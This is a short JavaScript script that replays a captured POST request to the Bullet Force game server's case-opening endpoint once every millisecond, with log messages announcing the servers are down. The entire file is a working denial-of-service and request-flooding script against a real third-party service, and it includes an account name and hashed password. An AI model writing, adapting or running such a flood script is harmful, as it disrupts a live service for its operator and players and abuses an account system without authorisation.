function sendRequest() {
    fetch("https://server.blayzegames.com/OnlineAccountSystem/open_case.php?requiredForMobile=595851806", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Opera GX\";v=\"107\", \"Chromium\";v=\"121\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site"
        },
        "referrer": "https://games.crazygames.com/",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": "username=PC-SlashUnlockAll&password=ED6B8D2CCF794DF6D85DAF2F4B7097AEFC91C975A1E757EEE3C15038D52CFF2DC26D5B6710AAC95BC6A8980BFE18C125C1F2F5B9F3DB1A70C8914F2FAA8520B1&case_type=credit&username=PC-SlashUnlockAll&password=ED6B8D2CCF794DF6D85DAF2F4B7097AEFC91C975A1E757EEE3C15038D52CFF2DC26D5B6710AAC95BC6A8980BFE18C125C1F2F5B9F3DB1A70C8914F2FAA8520B1",
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    })
    .then(response => {
        if (!response.ok) {
            console.log('Bullet Force Servers are now DOWN!');
        }

        if (response.ok) {
            console.log('Packet Sent!');
        }
    })
    .catch(error => {
        console.error('Failed:', error.message);
    });
}

// Call sendRequest every 1 milliseconds
setInterval(sendRequest, 1);